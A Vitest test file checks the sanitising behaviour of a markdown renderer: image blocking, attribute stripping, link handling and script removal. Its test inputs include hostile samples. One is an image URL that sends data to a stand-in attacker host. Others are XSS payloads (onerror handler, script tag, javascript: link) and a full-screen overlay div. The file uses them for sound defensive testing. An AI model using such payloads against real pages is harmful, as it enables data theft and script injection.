// @vitest-environment jsdom
import { describe, expect, it } from 'vitest';
import { renderMarkdown } from '../src/markdown';

describe('renderMarkdown', () => {
  it('renders GFM: code blocks, tables, inline code, line breaks', () => {
    const html = renderMarkdown('**bold** `x`\nnext\n\n```ts\nconst a = 1;\n```\n\n| a | b |\n|---|---|\n| 1 | 2 |');
    expect(html).toContain('<strong>bold</strong>');
    expect(html).toContain('<code>x</code>');
    expect(html).toContain('<br>');
    expect(html).toMatch(/<pre><code>const a = 1;/);
    expect(html).toContain('<table>');
  });

  it('never auto-loads local paths or remote images', () => {
    expect(renderMarkdown('![office](/private/tmp/a.png)')).toContain('🖼️ office');
    expect(renderMarkdown('![office](/private/tmp/a.png)')).not.toContain('<img');
    const remote = renderMarkdown('![x](https://attacker.example/?d=secret) <img src="https://attacker.example/p.gif">');
    expect(remote).not.toMatch(/<img[^>]+src=/);
    expect(remote).toContain('href="https://attacker.example/?d=secret"');
  });

  it('drops style, class and id so transcript text cannot overlay the UI', () => {
    const html = renderMarkdown('<div style="position:fixed;inset:0" class="keys" id="panel">Press 1</div>');
    expect(html).not.toMatch(/style=|class=|id=/);
  });

  it('shows local screenshots through a provided URL mapper', () => {
    const html = renderMarkdown('![rooms](/tmp/shots/demo1.png)', { localImage: (p) => `/api/local-image?path=${encodeURIComponent(p)}` });
    expect(html).toContain('<img');
    expect(html).toContain('src="/api/local-image');
    expect(html).toContain('/api/local-image?path=%2Ftmp%2Fshots%2Fdemo1.png');
  });

  it('opens links in a new tab', () => {
    expect(renderMarkdown('[docs](https://example.com)')).toContain('target="_blank"');
  });

  it('strips script and event-handler payloads', () => {
    const html = renderMarkdown('hi <img src=x onerror="alert(1)"> <script>alert(2)</script> [x](javascript:alert(3))');
    expect(html).not.toMatch(/onerror|<script|javascript:/i);
  });
});
